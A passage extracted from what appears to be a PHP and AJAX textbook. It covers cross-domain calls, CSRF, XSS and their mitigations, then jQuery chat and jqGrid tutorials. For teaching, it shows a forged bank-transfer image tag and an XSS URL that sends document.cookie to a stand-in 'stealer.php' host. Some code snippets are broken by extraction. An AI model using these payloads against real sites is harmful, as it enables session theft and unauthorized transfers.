 sleep(10); 
  
 echo $result; 
  
 ?>
  
 [
  213 
 ]",NA
Cross-domain calls,"One of the most important limitations of using the 
 XmlHttpRequest
  object is the 
 same domain policy 
 http://en.wikipedia.org/wiki/Same_origin_policy 
 that prevents cross-domain calls. Even requests to a sub-domain of your domain 
 (
 www.example.com
  of 
 example.com
 , for example) are denied by the browser.
  
 Many of today's applications are mashups and AJAX applications. While AJAX 
 applications can speak to the same server using 
 XmlHttpRequest
 , mashups typically 
 gather data from different servers. In order to address this problem, there are some 
 classic solutions for this problem:
  
 •
  
 Cross-domain calls using a server proxy
  
 •
  
 Cross-domain calls using Flash
  
 •
  
 Cross-domain calls using iframes
  
 •
  
 Cross-domain calls using JSONP
  
 Each of these techniques deserves an entire chapter. However, we will try to cover 
 them briefly here and point you to further reading.",NA
Cross-domain calls using a server proxy,"This approach represents the most common and intuitive approach.
  
 The client-side script makes a normal XmlHttpRequest to the server, passing along all 
 the necessary information. The server acts like a proxy, forwards the client request to 
 the server located on another domain, and returns the result to the client. The 
 communication with the remote server is the requesting server's responsibility, 
 rendering communication errors and additional processing before and after the remote 
 request much easier to deal with.",NA
Cross-domain calls using Flash,"Flash offers the possibility for cross-domain calls if the remote server has a 
  
 special policy file. There are a few nice posts at 
 http://blog.monstuff.com/ 
 archives/000280.html
  and 
 http://www.xml.com/pub/a/2006/06/28/ 
  
 flashxmlhttprequest-proxy-to-the-rescue.html
  describing how it can be done.
  
 There are also some possible security issues explained by the Adobe guys at 
 http://www.adobe.com/devnet/flashplayer/articles/cross_domain_policy.
  
 html
  and by others at 
 http://shiflett.org/blog/2006/sep/the-dangers-of-
 cross-domain-ajax-with-flash
 .
  
 [
  216 
 ]",NA
Cross-domain calls using iframes,"Until HTML 5's <postMessage> becomes widely adopted 
  
 (see 
 http://www.whatwg.org/specs/web-apps/current-work/multipage/ 
 comms.html#crossDocumentMessages
 ), we can rely on this technique to 
 communicate between iframes 
 http://softwareas.com/cross-domain-
 communication-with-iframes
 .",NA
Cross-domain calls using JSONP,"JSONP or ""JSON with padding"" probably represents the most common approach to 
 making cross domain calls. It relies on the 
 <script>src
  element which does not have 
 the ""same domain"" policy applied to it.
  
 With great power comes great responsibility
 —making cross-domain calls via <script> 
 opens a whole world of possibilities.
  
 If it is valid, JavaScript will execute the code in a 
 script
  element. Suppose we have this 
 code:
  
 <script src='http://www.otherdomain.com/getjsondata.php'><src>
  
 The result is a JSON object like this:
  
 {bank_account:13456, balance:1245}
  
 A simple JSON object doesn't execute, but if the server returns a function call, the 
 callback function will be called with the data passed as arguments:
  
 showBalance({bank_account:13456, balance:1245});
  
 In order to be able to make a cross-domain call and have a callback function in the 
 response, the server needs the name of the callback function. All that's left for the 
 server to do is to wrap the data with the callback function:
  
 <script 
 src='http://www.otherdomain.com/getaccountbalance.php?account= 
 13456&callback=showBalance&format=json'><src>
  
 To make JSONP cross-domain calls dynamically, we generate script elements 
 dynamically by appending a 
 <script>
  element to the 
 <head>
  element.
  
 var headTag = document.getElementsByTagName(""head"")[0];
  
 var myScript = document.createElement('script');
  
 myScript.type = 'text/javascript';myScript.src = 'http://www.
  
 otherdomain.com/getaccountbalance.php?account=13456&callback=showBala
 n ce&format=json';
  
 headTag.appendChild(myScript);
  
 [
  217 
 ]",NA
Cross-site request forgery,"Cross-site request forgery (CSRF or ""sea-surf"" or XSRF) represents an exploit where an 
 authenticated user performs a command without having the website verifying that the 
 user himself had initiated that specific command.
  
 CSRF is a form of confused-deputy attack 
 http://en.wikipedia.org/wiki/ 
 Confused_Deputy
 , where the confused deputy in this case is the browser.
  
  
 This attack is based on the fact that the 
 web application
  trusts the user.
  
  
 Let's take a walk through a typical attack.
  
 Alice visits a website she trusts (her bank's website 
 http://www.mybank.com
 ) and 
 she logs in. The bank's website sends in response an authentication token inside a 
 cookie that will be used for all subsequent requests for authentication purposes. 
  
 Without logging out of the bank's website (supposing that this action invalidates the 
 cookie) she soon visits Mallory's malicious website 
 http://www.malicious.com/ 
 evilform.php
 . She could access this malicious site by clicking a link in a spam.
  
 Mallory knows that for transferring money from Alice's account through the bank's 
 website, the URL looks like this: 
 http://www.mybank.com/transfermoney.php? 
 destinationaccount=malloryaccount&amount=10000
 .
  
 Inside the page (
 evilform.php
 ) Mallory has a markup like this:
  
 <img src='http://www.mybank.com/transfermoney.php? 
  
  destinationaccount=malloryaccount&amount=10000'></img>
  
 When Alice accesses 
 evilform.php
 , her browser is tricked into sending her bank's 
 authentication cookie, which is still valid, and results in a successful transfer.
  
 [
  218 
 ]",NA
JSON hijacking,"Another attack involves returning data in a JSON array via 
 GET
 . A JSON array is a 
 valid JavaScript script and it is executed. This is the vital information that gets 
 exploited. A JSON object on the other hand doesn't get executed. 
  
 Phil Haack has two excellent posts explaining cases:
  http://haacked.com/ 
 archive/2009/06/25/json-hijacking.aspx
  and 
 http://haacked.com/ 
 archive/2008/11/20/anatomy-of-a-subtle-json-vulnerability.aspx
 .",NA
Mitigations of CSRF,"There are some false beliefs about solving this potential attack:
  
 1. Creating ""secret"" cookie DOES NOT WORK because the browser will be 
  
 tricked into sending every cookie whether or not the user has been tricked.
  
 2. Exposing business logic methods only through 
 POST
  requests doesn't hold, 
  
 as a malicious user can easily craft a 
 POST
  request as well. 
  
 In order to mitigate this kind of risk, we can do several things:
  
 1. Check the 
 Referrer
  HTTP header; this might not work, as it is very common 
  
 for proxy servers to strip out this header in order to maintain privacy.
  
 2. Have the server generate a special CSRF token, with timeout inside a hidden input 
 field, and store it also in the session. This special token is checked for each 
 request. Now, the malicious user has to obtain the valid user's token in order to 
 succeed.
  
 3. Set an expiration time for authentication cookies.
  
 4. Expose, through 
 GET
 , only those methods that do not affect anything or contain 
 sensitive data, as in the JSON example. By exposing code that has side effects or 
 retrieving data only through POST, we eliminate attacks using image URLs, as in 
 the previously-mentioned examples, or link addresses.",NA
Cross-site scripting,"Cross
 -
 sitescripting
  (
 XSS
 ) represents a common security vulnerability of web 
 applications. The web application trusts a malicious user's input and allows code to 
 be injected. Other users accessing affected web pages become the victims of the 
 injected code, exposing sensitive information to the malicious user.
  
 [
  219 
 ]",NA
Exploits,"Generally speaking there are two types of attacks: 
 persistent 
 and 
 non-persistent
 .",NA
Non-persistent XSS,"This attack is by far the most common and can be easily prevented by correctly 
 escaping the data.
  
 One typical example is a search engine. It is a common practice for the terms the user 
 searches for to be displayed in the results. If we have HTML entities that are not properly 
 encoded the malicious entities are included in the search results and we end up with an 
 XSS hole. By using specially crafted URLs and convincing people to follow them, they gain 
 access to sensitive data.
  
 The following URL represents such a potential malicious URL: 
 www.
  
 searchengine.com/search.php?query=<SCRIPT>location.href=""http://www. 
 mallicioussite.com/stealer.php?c=""+escape(document.cookie)</SCRIPT>
 .
  
 The malicious user can gain access to valid authentication cookies that can then be 
 used to hijack the user's active session.",NA
Persistent XSS,"The persistent XSS is much more dangerous because it can affect a much larger 
 number of people, as it is rendered multiple times to multiple users.
  
 The typical scenario is when the data input from the malicious user is saved by an 
 application and then rendered to all the other users. For this and other reasons, it is 
 extremely important that un-trusted (perhaps all) data input be validated and that the 
 server escapes the output.
  
 [
  220 
 ]",NA
Mitigations of XSS,Let's see what we can do to prevent these types of exploits!,NA
Input validation,"One of the most important security vulnerabilities involves data validation. When not 
 properly done, it exposes security holes that can be exploited. 
  
 Validating data on the client side using JavaScript has been around for more than a 
 decade and is a very nice way to inform the user about possible errors without having 
 to incur unnecessary postbacks to the server. However, data that finally reaches the 
 server must be validated again. Input fields such as emails, addresses, and such must 
 be checked for malicious scripts that could lead to SQL injection or XSS attacks. 
  
 When the input must contain HTML characters, the solution is to use HTML 
 entities encoding.",NA
Escaping ,"A very common approach to eliminate XSS risks is to escape risky data before it is 
 placed in the HTML document. 
  
 There are several types of escaping:
  
 •
  
 Escape the Big 5 characters with HTML entities encoding:
  
  & -- &amp;
  
  < -- &lt;
  
  > -- &gt;
  
  "" -- &quot;
  
  ' -- &#x27;
  
 •
  
 Escape Javascript:
  
 alert(' [escape the text from here]')
  
 script src= '[escape the text from here]'
  
 eval (' [escape the text from here]')
  
 onEventHere=' [escape the text from here]'
  
 •
  
 Escape CSS:
  
 <style> [escape the text from here]</style>
  
 <element style=' [escape the text from here]'>
  
 [
  221 
 ]",NA
Cookies security,"The main exploit scenarios involve stealing information from the user's cookies. 
 Cookies are generally used for storing authenticated sessions and possibly other 
 sensitive data. 
  
 A way to secure the cookie is by using the 
 HttpOnly
  flag, which will make the 
 cookie inaccessible to client scripts, and 
 Secure
  flag to send it only via a secure 
 communication channel 
 http://blog.modsecurity.org/2008/12/ 
 fixing-both-missing-httponly-and-secure-cookie-flags.html
 . 
  
  
 Starting with PHP 5.2, the 
 HttpOnly
  cookie flag is supported. 
  
  
 We recommend including the IP address of the client in the authentication token sent to 
 the client browser in a cookie to maintain the session and validating the IP address each 
 time in order to prevent the misuse of stolen authentication credentials even when 
 cross-site scripting attacks can be performed. However, if the attacker is behind the 
 same web proxy, the exploit still works.",NA
Summary,"In this chapter, we briefly covered some of the most important patterns and 
 approaches covering usability, security, and techniques.
  
 [
  222 
 ]",NA
AJAX Chat with jQuery,"Online chat solutions were popular long before AJAX was born. There are numerous 
 reasons for this popularity, and you're probably familiar with them if you've ever used 
 an 
 Internet Relay Chat
  (
 IRC
 ) client or an 
 InstantMessenger
  (
 IM
 ) program. 
  
 In this chapter, you'll learn how to use AJAX to easily implement an online chat 
 solution. This will also be your opportunity to use one of the most important 
 JavaScript frameworks around—jQuery.
  
 More precisely, in this chapter you will:
  
 •
  
 •
  
 Understand the basics of jQuery 
  
 Learn how to create a simple, yet efficient client-server chat mechanism 
 using AJAX",NA
Chatting using AJAX,"AJAX has pushed online chat solutions forward by making it easy to implement 
 features that are troublesome or tricky to implement with other technologies. As 
 chats are typically happening in real time, delays on either end of the chat are 
 decidedly ""not good"".
  
 An AJAX chat application avoids the connectivity problems that are common with other 
 technologies, because many firewalls block the communication ports they use. (On the 
 other hand, AJAX uses exclusively HTTP for communicating with the server.) Using AJAX 
 to build your chat application also means that it will inherit all the typical AJAX benefits 
 such as integration with existing browser features.",NA
jQuery,"During the past few years, jQuery (
 www.jQuery.com
 ) has become one of the most 
 important JavaScript frameworks being used, even by Microsoft, to develop various 
 tools. Among its most important features are:
  
 •
  
 Lightweight footprint
  
 •
  
 Great documentation
  
 •
  
 Excellent DOM manipulation
  
 •
  
 Cross-browser compatibility
  
 •
  
 CSS3 compliant
  
 •
  
 Great Open Source Software (OSS) support
  
 Certain aspects of development tend to become trivial when using such a powerful 
 framework as jQuery, and in tandem to jQuery there are an impressive number of 
 available plugins and a very good UI library that simplifies the UI development. 
  
 jQuery is a complex subject and we don't intend to cover it all here—instead, we'll cover 
 just enough to get you started with this wonderful framework. In this chapter, you'll use 
 jQuery to build an online chat solution, and in Chapter 9 you will use it to implement an 
 editable data grid.
  
 [
  224 
 ]",NA
Before we get started,"In order to be able to develop anything, we need to include the jQuery framework in 
 our application. jQuery consists of a single file that can be downloaded from 
 www.jquery.com
 . It comes in two formats:
  
 •
  
 •
  
 Minified
 —this version has a very small download footprint; it is obfuscated and 
 should be used for production
  
 Uncompressed
 —this version is bigger; it is readable and should be used 
 for development
  
 Including the framework file in our page is as simple as writing the following line of 
 code in the head section of our page:
  
 <head> 
  
  <script type=""text/javascript"" src=""jquery-1.3.2.js"" ></script>
  
 </head>
  
 This piece of code includes the development version of jQuery. Including the 
 production version simply involves replacing 
 jquery-1.3.2.js
  with 
 jquery-1.3.2.min.js
 .",NA
The first steps,"When it comes to DOM programming, things are not simple at all. Using pure 
 JavaScript to deal with all the differences between browsers is a nightmare even for 
 experienced programmers. jQuery hides all those nasty bits, providing a browser-
 agnostic API, making DOM programming a breeze.
  
 There are a few core concepts key for using jQuery. Let's take a look at them!",NA
jQuery DOM Selectors,"Before we go to the core function of jQuery, it is important to know that its selectors allow 
 us to select multiple DOM elements so that we can manipulate them further on using 
 additional operational methods. The most important part is that selectors use CSS 3.0 
 syntax so that you can use the same syntax you were used to or even if you don't know it, 
 the learning curve is easy.
  
 Using CSS syntax we can select elements by their ID, CSS class, relationship to other 
 elements (parent, children, siblings), or even attribute filters.
  
 For example, 
 #gridtr:odd
  retrieves all the odd rows in a grid table.
  
 [
  225 
 ]",NA
jQuery wrapper object,"The entry point to the jQuery framework is the 
 jQuery()
  function. For convenience, it 
 also has an alias 
 $()
 .
  
 jQuery = window.jQuery = window.$ = function( selector, context ) {
  
  
  // The jQuery object is actually just the init constructor 
 'enhanced'
  
  return new jQuery.fn.init( selector, context );
  
  }
  
 As we can see 
 jQuery()
 , 
 window.jQuery()
  and 
 window.$()
  all point to the same 
 anonymous function that actually creates the 
 jQuery
  object.
  
 The first parameter typically is a selector string allowing us to define an expression for 
 getting the DOM elements we want. 
  
 The second parameter is optional and points to the context the selector should be 
 evaluated against. By default, if missing, the context refers to the current HTML 
 document. It can contain a DOM element or a jQuery object.
  
 The most important part is that the 
 jQuery()
  function also returns a jQuery object 
 allowing for chained method calls. The resulting DOM elements after applying the 
 selector are not returned as such, being wrapped in a jQuery object.
  
 For the above selector, the complete jQuery syntax for adding a specific CSS class to 
 them is:
  
 $(""#grid tr:odd"").addClass(""gridodd"")
  
 The object just created has a handful of methods that allow us to work with the DOM in a 
 transparent and elegant manner.
  
 If you are looking for a quick reference, check out this cheat sheet:
  
 •
  
 http://www.javascripttoolbox.com/jquery/cheatsheet/
  
 [
  226 
 ]",NA
Method chaining ,"Method chaining is a programming technique where a class has many methods, each of 
 which returns the object itself.
  
 Method chaining is the approach for jQuery, as it has a lot of methods and most of them 
 return a jQuery wrapper object allowing for chaining calls to several methods of the 
 jQuery object.
  
 In the previous example, an additional CSS class was added to the selected table rows 
 returned by the CSS selector passed to the 
 jQuery()
  function.
  
 By using this technique we get a much cleaner and expressive code.",NA
Event handling ,"Dealing with events in different browsers can be quite a nightmare but jQuery offers a 
 simple, consistent, and efficient way to handle and to raise events.
  
 jQuery provides the 
 bind()
  and 
 unbind()
  high-level functions allowing the attaching 
 and detaching of event handlers to matched elements. The list of possible events is quite 
 comprehensible: 
 blur,focus,load,resize,scroll,unload, 
 beforeunload,click,dblclick,mousedown,mouseup,mousemove,mouseover, 
 mouseout,mouseenter,mouseleave,change,select,submit,keydown, 
 keypress,keyup,error,ready
 .
  
 The 
 one()
  function behaves like 
 bind
  except that the handler is executed only once for 
 each matching element.
  
 Common events like those listed above have also their own handler functions. The 
 handler function has a simple parameter representing the event.
  
 $('#elm').click(function(e)) 
  
 {
  
  alert('I was clicked!'); 
  
 }
  
 [
  227 
 ]",NA
A simple example ,"Back in Chapter 5, 
 AJAX Form Validation
 , we built a simple object that abstracts all the 
 AJAX queries under a simple API. When it came to work with the DOM elements for 
 populating the page with the results, we used raw JavaScript to retrieve a HTML element 
 and set its 
 innerHTML
  property:
  
  XmlHttp
  
  
  ({url:'async.txt',
  
  
  complete:function(xhr,response,status)
  
    
  {        
  
     
  document.getElementById(""test"").innerHTML = response;
    
  }
  
  
  });
  
 Things get smoother with jQuery:
  
 $.ajax({
  
  url: 'async.txt',
  
  dataType: 'html',
  
  success: function(data, textStatus) {
  
  
  
  $('#test').html(data); 
  
 } 
  
 [
  228 
 ]",NA
Basic concepts,"Provided that you're already familiarized with the OOP features in JavaScript (you've 
 learned about these features in Chapter 3, 
 Object Oriented JavaScript
 ), here are a few 
 basics to keep in mind:
  
 •
  
 •
  
 •
  
 $
  operates as an alias for the 
 jQuery
  namespace. Rather than using 
 jQuery.function()
 , you can simply use 
 $.function()
 . If at some point 
 you want the 
 $
  to function as a 
 $
  and not a namespace reference for jQuery, 
 you will need to override this using 
 jQuery.noConflict()
 . Alternatively, 
 you could instead define your own nickname for jQuery by defining it as a 
 variable and assigning its value to the function, as in 
 varnn=jQuery.noConflict()
 .
  
 Typically, jQuery is implemented as a solitary file with all of the other elements 
 (DOM, AJAX, events) within this single file, which is then included in the 
 <head>
  
 element of the HTML document.
  
 jQuery functions (commands) can be chained together. This offers you the 
 powerful ability to select elements/objects, filter them, extend them, take 
 action on them, change their appearance, and so on in a chain.
  
 Having just touched on jQuery won't suffice when you need to develop complex jQuery 
 applications. The following links should get you digging in and picking up speed pretty 
 quickly (they're worth the time!):
  
 •
  
 http://docs.jQuery.com/Tutorials
  
 •
  
 http://www.west-wind.com/presentations/jQuery/
  
 •
  
 http://www.learningjQuery.com/
  
 If you're more inclined to sit by the fire with a book, you'll like these:
  
 •
  
 •
  
 •
  
 •
  
 jQuery Reference Guide
 –
 A Comprehensive Exploration of the Popular JavaScript 
 Library
  by Karl Swedberg and Jonathan Chaffer, Packt Publishing 
  
 Learning jQuery 1.3 
 by Karl Swedberg and Jonathan Chaffer, Packt Publishing 
 jQuery UI 1.6: The User Interface Library for jQuery
  by Dan Wellman, 
  
 Packt Publishing 
  
 jQuery in Action
  by Bear Bibeault, Yehuda Katz, Manning Publications
  
 [
  229 
 ]",NA
AJAX chat,"Now, it's time to implement the AJAX chat application. We'll keep the application simple, 
 modular, and extensible. We won't implement a login module, support for chat rooms, 
 the online users list, and so on. By keeping it simple we'll focus on what the goal of this 
 chapter is: posting and retrieving messages without causing any page reloads. We'll also 
 let the user pick a color for her or his messages, because this involves an AJAX 
 mechanism that is another good exercise.
  
 The chat application can be tested online at 
 http://ajaxphp.packtpub.com
 , and 
 should look like Figure 8-1:
  
  
 Figure 8-1: Online chat application built with AJAX and jQuery
  
 Using jQuery as a framework will simplify things: we won't need to worry about 
 constructing 
 XmlHttpRequest
  by ourselves and implementing design patterns and 
 best practices. 
  
 [
  230 
 ]",NA
The chat application,"Here we use a MySql database and AJAX to store and retrieve the users' messages and 
 pass them between the client and the server. The chat window contacts the server 
 periodically to send and retrieve the newest posted messages from the server to each 
 user. Our DB will also hold username and text color information used in the application.
  
 Implementing this functionality involves creating the files and structures shown in the 
 following figure:
  
 Ajax Chat Client
  
 Ajax Chat Server
  
 MySQL database
  
 ajax database
  
 index.html
  
 chat.php
  
 chat.js
  
 chat.class.php
  
 chat data table
  
 jQuery-1.3.2js
  
 color.php
  
 chat.css
  
 config.php
  
 palette.png
  
 error_handler.php
  
 Figure 8-2: The components of the AJAX Chat application
  
 [
  231 
 ]",NA
Time for action – implementing AJAX chat with JSON ,"Follow these steps to implement your AJAX Chat application:
  
 1. First we need the database that will hold our user information. Connect to the 
 ajax
  database, and create a table named 
 chat
  with the following code:
  
 CREATE TABLE chat 
  
 ( 
  
 chat_id int(11) NOT NULL 
 auto_increment, 
  
 posted_on datetime NOT NULL, 
  
 user_name varchar(255) NOT NULL, 
  
 message text NOT NULL, 
  
 color char(7) default '#000000', 
  
 PRIMARY KEY (chat_id) 
  
 );
  
 2. In your 
 ajax
  folder, create a new folder named 
 chat
 .
  
 [
  233 
 ]",NA
What just happened?,"First, make sure the application works well. Load 
 http://localhost/ajax/chat/ 
 index.html
  with a web browser, and you should get a page that looks like the one in 
 Figure 8-1. 
  
 If you analyze the code for a bit, the details will become clear. Everything starts with 
 index.html
 . The only part that is really interesting in 
 index.html
  is a scrolling region 
 implemented in DHTML. (A little piece of information regarding scrolling can be found at 
 http://www.dyn-web.com/code/scroll/
 .)
  
 The scrolling area allows our users to scroll up and down the history of the chat and 
 ensures that any new messages that might flow out of the area are still viewed. In our 
 example, the 
 scroll<div>
  element and its inner layers do the trick. The 
 scroll 
 element 
 is the outermost layer; it has a fixed 
 width
  and 
 height;
  and its most useful property, 
 overflow,
  determines how any content that falls (or overflows) outside of its boundaries 
 is displayed. Generally, the content of a block box is confined to the content edges of the 
 box. In CSS, the 
 overflow
  property has four possible values that specify what should 
 happen when an element overflows its area: visible, hidden, scroll, and auto. (For more 
 details, please see the specification of overflow, at 
 http://www.w3.org/TR/REC-
 CSS2
 /visufx.html
 .) 
  
 As you can see, the HTML file is very clean. It contains only the declarations of the 
 HTML elements that make up the user interface. There are no event handlers and 
 there is no JavaScript code inside the HTML file—we have a clean separation 
 between the user interface and the programming. 
  
 [
  249 
 ]",NA
How does the color picker work?,"Here we use AJAX to call the PHP script that can tell us which text color was chosen by the 
 user from the color palette. We use an image containing the entire spectrum of colors and 
 allow the user choose any color for the text he or she writes. When the user clicks on the 
 palette, the mouse coordinates are sent to the server, which obtains the color code, stores 
 it in the user's DB entry, and sets the user's test to that color.
  
 This part, which might seem pretty difficult, actually proves to be easy to implement. The 
 relative position of the pixel in the palette is retrieved in the JavaScript code:
  
 // handle the click event on the image
  
  $('#palette').click(
  
  
  
  function(e) {
  
  
   
  // http://docs.jQuery.com/Tutorials:Mouse_Position        
  
   
  // retrieve the relative mouse position inside the image
  
   
  var x = e.pageX - $('#palette').position().left;
  
  
   
  var y = e.pageY - $('#palette').position().top;
  
  
   
  );
  
  
  
  }
  
  );
  
 Inside the same handler, we make an AJAX request and retrieve the 
  
 corresponding RGB color using the 
 color.php
  server-side page that contains the 
 necessary functionality:
  
 // make the ajax request to get the RGB code
  
  $.ajax({
  
  
  url: 'color.php',
  
  
  success: function(data, textStatus) {
  
  
  
  
  if(data.errno != null)
  
  
  
  
   
  displayPHPError(data);
  
  
  
  
  
  else
  
  
  
  
  
  {
  
  
  
  
   
  $('#color')[0].value = data.color;
  
  
  
  
   
  $('#sampleText').css('color', 
 data.color);
   
   
  }
  
 [
  257 
 ]",NA
Summary,"At the beginning of the chapter, we saw why one can face problems when 
  
 communicating with other people in a dynamic way over the Internet. We saw what the 
 solutions for these problems are and how AJAX chat solutions can bring something new, 
 useful, and ergonomic. After seeing some other AJAX chat implementations, we started 
 building our own solution. Step by step, we have implemented our AJAX chat solution, 
 keeping it simple, easily extensible, and modular.
  
 After reading this chapter, you can try improving the solution, by adding new 
 features such as:
  
 •
  
 •
  
 •
  
 Chat rooms 
  
 Simple command lines (joining/leaving a chat room, switching between chat 
 rooms) 
  
 Private messaging
  
 [
  259 
 ]",NA
AJAX Grid,"One of the most common ways to render data is in the form of a data grid. Grids are used 
 for a wide range of tasks from displaying address books to controlling inventories and 
 logistics management. Because centralizing data in repositories has multiple advantages 
 for organizations, it wasn't long before a large number of applications were being built 
 to manage data through the Internet and intranet applications by using data grids. But 
 compared to their desktop cousins, online applications using data grids were less than 
 stellar—they felt cumbersome and time consuming, were not always the easiest things 
 to implement (especially when you had to control varying access levels across multiple 
 servers), and from a usability standpoint, time lags during page reloads, sorts, and edits 
 made online data grids a bit of a pain to use, not to mention the resources that all of this 
 consumed. 
  
 As you are a clever reader, you have undoubtedly surmised that you can use AJAX to 
 update the grid content; we are about to show you how to do it! Your grids can update 
 without refreshing the page, cache data for manipulation on the client (rather than asking 
 the server to do it over and over again), and change their looks with just a few keystrokes! 
 Gone forever are the blinking pages of partial data and sessions that time out just before 
 you finish your edits. Enjoy!
  
 In this chapter, we're going to use a jQuery data grid plugin named jqGrid. jqGrid is 
 freely available for private and commercial use (although your support is 
  
 appreciated) and can be found at: 
 http://www.trirand.com/blog/
 . You may have 
 guessed that we'll be using PHP on the server side but jqGrid can be used with any of the 
 several server-side technologies. On the client side, the grid is implemented using 
 JavaScript's jQuery library and JSON. The look and style of the data grid will be 
 controlled via CSS using themes, which make changing the appearance of your grid easy 
 and very fast. Let's start looking at the plugin and how easily your newly acquired AJAX 
 skills enable you to quickly add functionality to any website.",NA
Implementing the AJAX data grid ,"The files and folders for this project can be obtained directly from the code download for 
 this chapter, or can be created by typing them in. 
  
 We encourage you to use the code download to save time and for accuracy. If you 
 choose to do so, there are just a few steps you need to follow:
  
 1. Copy the 
 grid
  folder from the code download to your 
 ajax
  folder.
  
 2. Connect to your 
 ajax
  database and execute the 
 product.sql
  script.
  
 3. Update 
 config.php
  with the correct database username and password. 4. Load 
 http://localhost/ajax/grid
  to verify the grid works fine—it should 
  
 look just 
 like Figure 9-1.
  
 [
  262 
 ]",NA
Code overview,"If you prefer to type the code yourself, you'll find a complete step-by-step exercise 
  
 a bit later in this chapter. Before then, though, let's quickly review what our grid is 
  
 made of. We'll review the code in greater detail at the end of this chapter.
  
 The editable grid feature is made up of a few components:
  
 •
  
 product.sql
  is the script that creates the grid database
  
 •
  
 config.php
  and 
 error_handler.php
  are our standard helper scripts
  
 •
  
 grid.php
  and 
 grid.class.php
  make up the server-side functionality
  
 [
  263 
 ]",NA
The database,"Our editable grid displays a fictional database with products. On the server side, we 
 store the data in a table named 
 product
 , which contains the following fields:
  
 •
  
 •
  
 •
  
 •
  
 product_id
 : A unique number automatically generated by auto-increment in 
 the database and used as the Primary Key 
  
 name
 : The actual name of the product 
  
 price
 : The price of the product for sale 
  
 on_promotion
 : A numeric field that we use to store 
 0
 /
 1
  (or true/false) 
 values. In the user interface, the value is expressed via a checkbox
  
 The Primary Key is defined as the 
 product_id
 , as this will be unique for each product it 
 is a logical choice. This field cannot be empty and is set to auto-increment as entries are 
 added to the database:
  
 CREATE TABLE product
  
 (
  
  product_id INT UNSIGNED NOT NULL AUTO_INCREMENT,
  
  name VARCHAR(50) NOT NULL DEFAULT '',
  
  price DECIMAL(10,2) NOT NULL DEFAULT '0.00',
  
  on_promotion TINYINT NOT NULL DEFAULT '0',
  
  PRIMARY KEY (product_id)
  
 );
  
 The other fields are rather self-explanatory—none of the fields may be left empty and 
 each field, with the exception of 
 product_id,
  has been assigned a default value. The 
 tinyint
  field will be shown as a checkbox in our grid that the user can simply set on or 
 off. The 
 on-promotion
  field is set to 
 tinyint
 , as it will only need to hold a true (
 1
 ) or 
 false (
 0
 ) value.
  
 [
  264 
 ]",NA
Styles and colors,"Leaving the database aside, it's useful to look at the more pertinent and immediate 
 aspects of the application code so as to get a general overview of what's going on here.
  
 We mentioned earlier that control of the look of the grid is accomplished through 
 CSS. Looking at the 
 index.html
  file's 
 head
  region, we find the following code:
  
 <link rel=""stylesheet"" type=""text/css"" href=""scripts/themes/coffee/ 
 grid.css"" title=""coffee"" media=""screen"" /> 
  
 <link rel=""stylesheet"" type=""text/css"" media=""screen"" href=""themes/ 
 jqModal.css"" />
  
 Several themes have been included in the 
 themes
  folder; 
 coffee
  is the theme being 
 used in the code above. To change the look of the grid, you need only modify the theme 
 name to another theme, 
 green
 , for example, to modify the color theme for the entire 
 grid. Creating a custom theme is possible by creating your own images for the grid 
 (following the naming convention of images), collecting them in a folder under the 
 themes folder, and changing this line to reflect your new theme name. There is one 
 exception here though, and it affects which buttons will be used. The buttons' 
 appearance is controlled by imgpath: '
 scripts/themes/green/images
 ', found in 
 index.html
 ; you must alter this to reflect the path to the proper theme.
  
 Changing the theme name in two different places is error prone and we should do this 
 carefully. By using jQuery and a nifty trick, we will be able to define the theme as a 
 simple variable. We will be able to dynamically load the CSS file based on the current 
 theme and imgpath will also be composed dynamically. 
  
 The nifty trick involves dynamically creating the <link> tag inside head and setting the 
 appropriate href attribute to the chosen theme. 
  
 Changing the current theme simply consists of changing the theme JavaScript variable.
  
 JqModal.css
  controls the style of our pop-up or overlay window and is a part of the 
 jqModal plugin. (Its functionality is controlled by the file 
 jqModal.js
  found in the 
 scripts/js
  folder.) You can find the plugin and its associated CSS file at: 
 http://dev.iceburg.net/jquery/jqModal/
 .
  
 In addition, in the head region of 
 index.html
 , there are several 
 scriptsrc 
 declarations for the files used to build the grid (and 
 jqModal.js
  for the overlay):
  
 <script src=""scripts/jquery-1.3.2.js"" 
  
  
  type=""text/javascript""></script> 
  
 <script src=""scripts/jquery.jqGrid.js"" 
  
  
  type=""text/javascript""></script> 
  
 <script src=""scripts/js/jqModal.js"" type=""text/javascript""></script> 
 <script src=""scripts/js/jqDnR.js"" type=""text/javascript""></script>
  
 [
  265 
 ]",NA
The server side,"The code at the server side is made up of 
 grid.php
  and 
 grid.class.php
 . The 
 former is a simple script that receives 
 load
  and 
 save
  requests from the client. Its 
 structure is something like the following:
  
 <?php
  
 ... initialization
  
 // load the grid
  
 if($action == 'load')
  
 {
  
  ... load the grid here
  
 }
  
 // save the grid data
  
 elseif ($action == 'save')
  
 {
  
  ... save the grid here
  
 }
  
 ?>
  
 [
  267 
 ]",NA
"Creating the grid, step by step","If you prefer to write the code yourself, just follow these steps:
  
 1. Before we do anything, we'll need some data to work with. Create your 
 products table executing the following SQL code in phpMyAdmin. (For 
 briefness, we included here only a few of the product entries that you can 
 find in the downloadable version.)
  
 USE ajax;
  
 CREATE TABLE product 
  
 (
  
  
  product_id INT UNSIGNED NOT NULL AUTO_INCREMENT,
  
  
  name VARCHAR(50) NOT NULL DEFAULT '',
  
  
  price DECIMAL(10,2) NOT NULL DEFAULT '0.00',
  
  
  on_promotion TINYINT NOT NULL DEFAULT '0',
  
  
  PRIMARY KEY (product_id) 
  
 ); 
  
 INSERT INTO product(name, price, on_promotion) VALUES('Santa 
 Costume', 14.99, 0); 
  
 INSERT INTO product(name, price, on_promotion) VALUES('Medieval 
 Lady', 49.99, 1); 
  
 INSERT INTO product(name, price, on_promotion) VALUES('Caveman', 
 12.99, 0); 
  
 INSERT INTO product(name, price, on_promotion) VALUES('Costume 
 Ghoul', 18.99, 0);
  
 [
  268 
 ]",NA
Summary,"As with all endeavors, the more time you spend actually practicing it, the more 
 adept you become—AJAX is no exception. We've endeavored to give you the tools 
 you need to jump right in and begin putting them to good use—either creating sites 
 from scratch or maintaining and updating an existing application. 
  
 With a solid understanding of the mechanics behind the magic, you are well on 
 your way to success. 
  
 We're always pleased to hear from our readers and glimpse the projects that they've 
 implemented using our materials—feel free to drop us a note and let us know what 
 you're working on! We hope you have enjoyed learning AJAX with us—it has been our 
 privilege to take the journey with you!
  
 [
  277 
 ]",NA
Preparing Your Working ,NA,NA
Environment,"In this appendix, we'll cover the installation instructions that set up your machine for the 
 exercises in this book. You'll find separate installation instructions for Windows and *NIX-
 based machines. We'll also cover preparing the database that is used in many examples 
 throughout the book.
  
